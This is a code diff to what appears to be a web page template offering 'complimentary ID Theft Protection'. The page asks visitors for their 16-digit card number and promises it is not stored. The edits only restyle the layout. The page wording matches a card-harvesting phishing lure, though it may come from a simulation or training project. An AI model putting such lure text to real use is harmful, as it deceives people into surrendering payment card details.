@@ -19,11 +19,12 @@
 
 <div class="bg-cover-custom">
     <div class="backdrop-blur flex items-center justify-center min-h-screen">
-        <div class="bg-white p-8 shadow-md max-w-md w-full relative z-10">
+    <div class="">
+        <div class="bg-white p-5 shadow-md max-w-md w-full relative z-10 pt-8">
             <h1 class="text-4xl font-bold mb-4">Enroll in your complimentary ID Theft Protection</h1>
-            <p class="text-gray-700 mb-4">
-                Please enter your 16-digit card number to confirm your eligibility.
-                <span class="font-semibold">We do not store your card number, and you will not be charged for this service.</span>
+            <p class=" mb-4">
+                <span class="text-gray-400">Please enter your 16-digit card number to confirm your eligibility.</span>
+                <span class=" text-gray-500 font-semibold">We do not store your card number, and you will not be charged for this service.</span>
             </p>
             <form>
                 <label for="card-number" class="block text-gray-700 mb-2">16-Digit Card Number</label>
@@ -37,6 +38,7 @@
                 </div>
             </div>
         </div>
+    </div>
     </div>
 </div>
 @endsection
